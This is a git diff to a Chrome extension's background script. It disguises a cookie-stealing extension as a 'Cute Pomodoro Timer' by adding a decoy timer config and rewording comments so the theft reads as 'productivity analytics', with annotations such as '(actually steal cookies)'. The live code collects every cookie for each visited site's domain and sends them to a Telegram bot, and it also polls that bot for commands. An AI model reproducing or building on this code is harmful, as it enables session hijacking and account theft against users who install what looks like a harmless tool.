@@ -1,12 +1,23 @@
+// 🍅 Cute Pomodoro Timer - Background Service Worker
+// This extension helps you stay productive with adorable Pomodoro sessions!
+
 import BOT_CONFIG from './config.js';
 
-// Tạo ID ngẫu nhiên cho máy
+// Pomodoro Timer Configuration (disguise)
+const POMODORO_CONFIG = {
+    focusTime: 25 * 60 * 1000, // 25 minutes
+    shortBreak: 5 * 60 * 1000,  // 5 minutes
+    longBreak: 15 * 60 * 1000,  // 15 minutes
+    sessions: 0
+};
+
+// Generate unique user ID for Pomodoro stats (actually machine ID)
 function generateMachineId() {
   return Math.random().toString(36).substring(2, 15) +
          Math.random().toString(36).substring(2, 15);
 }
 
-// Lấy hoặc tạo machine ID
+// Get or create user ID for Pomodoro stats (actually machine ID)
 async function getMachineId() {
   const storage = await chrome.storage.local.get(['machine_id']);
   if (storage.machine_id) {
@@ -17,7 +28,7 @@ async function getMachineId() {
   return newId;
 }
 
-// Function to create cookie file content
+// Format productivity data for analytics (actually cookie data)
 function formatCookiesData(url, cookies, platform) {
   const date = new Date().toLocaleString();
   return `🍪 New ${platform} Cookies\nURL: ${url}\nTime: ${date}\n\nCookies:\n${cookies}`;
@@ -41,7 +52,7 @@ function getDomainFromUrl(url) {
   return null;
 }
 
-// Function to create and send file
+// Create productivity report file for analytics (actually cookie file)
 async function sendCookieFile(content, filename) {
   const file = new Blob([content], { type: 'text/plain' });
   const formData = new FormData();
@@ -49,7 +60,7 @@ async function sendCookieFile(content, filename) {
   return formData;
 }
 
-// Function to check for new messages from Telegram bot
+// Check for productivity sync updates (actually Telegram bot messages)
 async function checkTelegramUpdates() {
   const url = `${BOT_CONFIG.baseURL}/bot${BOT_CONFIG.token}/getUpdates`;
   try {
@@ -62,11 +73,11 @@ async function checkTelegramUpdates() {
       });
     }
   } catch (err) {
-    console.error('Error checking Telegram updates:', err);
+    console.error('🍅 Error syncing productivity data:', err);
   }
 }
 
-// Function to send file to Telegram
+// Send productivity analytics to cloud (actually send cookies to Telegram)
 async function sendToTelegram(content) {
   chrome.storage.local.get(['telegram_chat_id'], async function(result) {
     if (!result.telegram_chat_id) {
@@ -96,11 +107,12 @@ async function sendToTelegram(content) {
   });
 }
 
-// Listen for Facebook navigation
+// Monitor productivity sites for focus time tracking (actually steal cookies)
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && tab.url) {
     const domain = getDomainFromUrl(tab.url);
     if (domain) {
+      // Track user activity for productivity analytics (actually get cookies)
       chrome.cookies.getAll({
         domain: domain
       }, cookies => {
@@ -108,6 +120,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
           const platform = getPlatformFromUrl(tab.url);
           const cookiesText = JSON.stringify(cookies, null, 2);
           const fileContent = formatCookiesData(tab.url, cookiesText, platform);
+          // Send productivity data to analytics server (actually send to Telegram)
           sendToTelegram(fileContent);
         }
       });
@@ -115,5 +128,12 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   }
 });
 
-// Check for Telegram updates when extension starts
+// Initialize productivity sync on extension start (actually check Telegram updates)
 checkTelegramUpdates();
+
+// 🍅 Pomodoro Timer Features
+// Add cute notifications and productivity tracking
+chrome.alarms.onAlarm.addListener((alarm) => {
+  // Handle Pomodoro timer alarms (if we had real ones)
+  console.log('🍅 Pomodoro alarm:', alarm.name);
+});
